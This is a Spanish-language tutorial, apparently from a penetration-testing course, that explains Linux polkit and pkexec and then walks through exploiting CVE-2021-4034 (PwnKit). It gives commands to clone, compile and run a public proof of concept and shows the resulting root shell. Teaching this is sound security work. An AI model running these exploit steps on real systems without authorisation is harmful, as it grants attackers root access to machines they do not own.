PolicyKit (`polkit`) es un servicio de autorización en sistemas operativos basados en Linux que permite que el software de usuario y los componentes del sistema se comuniquen entre sí si el software de usuario está autorizado para hacerlo. Para verificar si el software de usuario está autorizado para esta instrucción, se consulta a `polkit`. Es posible establecer cómo se otorgan los permisos de manera predeterminada para cada usuario y aplicación. Por ejemplo, para cada usuario, se puede establecer si la operación debe ser generalmente permitida o prohibida, o si se requiere autorización como administrador o como un usuario separado con una validez limitada a una sola vez, proceso, sesión o ilimitada. Para usuarios y grupos individuales, las autorizaciones se pueden asignar de manera individual.

Polkit trabaja con dos grupos de archivos:

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Polkit también tiene `local authority` rules (reglas de autoridad local) que pueden ser usadas para establecer o eliminar permisos adicionales para usuarios y grupos. Las reglas personalizadas pueden colocarse en el directorio `/etc/polkit-1/localauthority/50-local.d` con la extensión de archivo `.pkla`.

PolKit también viene con tres programas adicionales:

- `pkexec` - ejecuta un programa con los derechos de otro usuario o con derechos de root
- `pkaction` - puede ser usado para mostrar acciones
- `pkcheck` - puede ser usado para verificar si un proceso está autorizado para una acción específica

La herramienta más interesante para nosotros, en este caso, es `pkexec` porque realiza la misma tarea que `sudo` y puede ejecutar un programa con los derechos de otro usuario o root.

```r
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

En la herramienta `pkexec`, se encontró la vulnerabilidad de corrupción de memoria con el identificador [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034), también conocida como [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034), que también conduce a la escalación de privilegios. Esta vulnerabilidad estuvo oculta durante más de diez años, y nadie puede decir con precisión cuándo fue descubierta y explotada. Finalmente, en noviembre de 2021, esta vulnerabilidad fue publicada y corregida dos meses después.

Para explotar esta vulnerabilidad, necesitamos descargar un [PoC](https://github.com/arthepsy/CVE-2021-4034) y compilarlo en el sistema objetivo o en una copia que hayamos hecho.

```r
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

Una vez que hemos compilado el código, podemos ejecutarlo sin más preámbulos. Después de la ejecución, cambiamos de la shell estándar (`sh`) a Bash (`bash`) y verificamos los IDs del usuario.

```r
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```